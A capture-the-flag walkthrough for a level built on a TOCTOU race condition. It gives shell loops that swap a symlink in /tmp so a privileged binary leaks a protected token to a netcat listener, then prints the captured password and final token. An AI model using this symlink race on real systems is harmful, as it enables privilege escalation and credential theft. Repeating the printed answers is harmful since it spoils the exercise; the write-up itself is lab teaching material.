# Level10 Walkthrough

## Overview

This level exploits a race condition (TOCTOU - Time Of Check to Time Of Use). The binary checks access to a file before using it, allowing us to swap the file with a symbolic link at the right moment.

## Walkthrough

### 1. Prepare three terminals

#### Terminal 1: Run the vulnerable binary in a loop

```bash id="a1k9qp"
while true; do ./level10 /tmp/flag10 127.0.0.1; done
```

#### Terminal 2: Trigger the race condition

Continuously switch the symbolic link between a valid file and stdin:

```bash id="b7x2ls"
while true; do ln -sf "$PWD/token" /tmp/flag10; ln -sf /proc/self/fd/0 /tmp/flag10; done
```

#### Terminal 3: Listen for incoming data

```bash id="c3v8rt"
nc -lk 6969
```

### 2. Capture the password

* When the race condition succeeds, the token is sent to the netcat listener.
* Extract the password from the output:

```text id="d6k1ws"
woupa2yuojeeaaed06riuj63c
```

### 3. Switch user

```bash id="e9p4zu"
su flag10
```

**Password:**

```text id="f2m8qx"
woupa2yuojeeaaed06riuj63c
```

### 4. Retrieve the flag

```bash id="g5t1yn"
getflag
```

## Token

```text id="h8r7vd"
feulo4b72j7edeahuete3no7c
```

